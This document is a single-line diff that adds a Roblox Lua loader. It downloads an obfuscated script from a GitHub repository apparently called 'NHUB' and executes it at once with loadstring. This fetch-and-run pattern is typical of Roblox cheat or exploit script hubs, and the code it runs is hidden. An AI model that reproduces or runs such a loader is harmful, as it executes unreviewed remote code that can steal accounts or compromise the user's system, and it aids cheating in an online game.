@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nekopoichan-dev/NHUB/refs/heads/main/obfuscated_1792851568454.lua.txt"))()
